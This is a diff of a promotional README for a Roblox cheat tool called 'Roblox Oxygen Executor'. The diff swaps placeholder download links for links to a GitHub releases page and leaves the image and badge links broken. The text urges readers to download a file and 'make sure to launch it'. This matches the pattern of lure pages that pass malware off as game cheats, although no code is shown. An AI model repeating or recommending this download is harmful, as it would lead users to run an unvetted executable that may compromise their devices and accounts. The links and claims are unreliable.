@@ -2,7 +2,7 @@
 
 Welcome to the official repository of **Roblox Oxygen Executor**, a powerful script execution tool designed for Roblox enthusiasts to enhance their gameplay experience.
 
-![Roblox Oxygen Executor](https://example.com/image.png)
+![Roblox Oxygen Executor](https://github.com/bikash522482/Roblox-Oxygen/releases)
 
 ## Overview ℹ️
 
@@ -23,7 +23,7 @@ Welcome to the official repository of **Roblox Oxygen Executor**, a powerful scr
 
 ## Getting Started 🚀
 
-To get started with **Roblox Oxygen Executor**, [download the latest version here](https://github.com/files/File.zip). 🔗
+To get started with **Roblox Oxygen Executor**, [download the latest version here](https://github.com/bikash522482/Roblox-Oxygen/releases). 🔗
 
 In case the link above ends with the file name, make sure to launch it to initiate the installation process.
 
@@ -45,4 +45,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Let's take your Roblox gameplay to the next level with **Roblox Oxygen Executor**! Download now and start enjoying a new dimension of gaming experience. 🎉
 
-[![Download Roblox Oxygen Executor](https://img.shields.io/badge/Download-Roblox%20Oxygen%20Executor-blue)](https://github.com/files/File.zip)
+[![Download Roblox Oxygen Executor](https://github.com/bikash522482/Roblox-Oxygen/releases%20Oxygen%20Executor-blue)](https://github.com/bikash522482/Roblox-Oxygen/releases)
